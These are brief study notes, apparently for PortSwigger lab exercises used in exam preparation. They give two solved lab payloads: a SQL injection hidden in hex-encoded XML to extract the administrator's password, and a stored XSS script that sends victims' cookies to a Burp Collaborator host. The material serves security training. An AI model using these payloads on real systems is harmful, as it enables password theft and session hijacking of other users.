"These labs have been selected because they reinforce core web security testing skills - such as understanding encodings and using them to evade defences, and proficiency in exploiting cross-user attacks. These specific labs support your exam preparation in terms of skill development, but they are in no way a list of the components you'll be expected to solve to complete the exam."

# Lab: SQL injection with filter bypass via XML encoding
You will need [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) Burp Suite Extension
```xml
<?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
      <productId>
        2
      </productId>
    <storeId>
      <@hex_entities>
        1 union select password from users where username='administrator' 
      <@/hex_entities>
    </storeId>
  </stockCheck>
```

# Lab: Exploiting cross-site scripting to steal cookies 
A simulated victim user views all comments after they are posted.<br>
Write this payload into comment section:
```js
<script> document.location = "http://<BURP-COLLABORATOR>/?" + document.cookie </script>
```
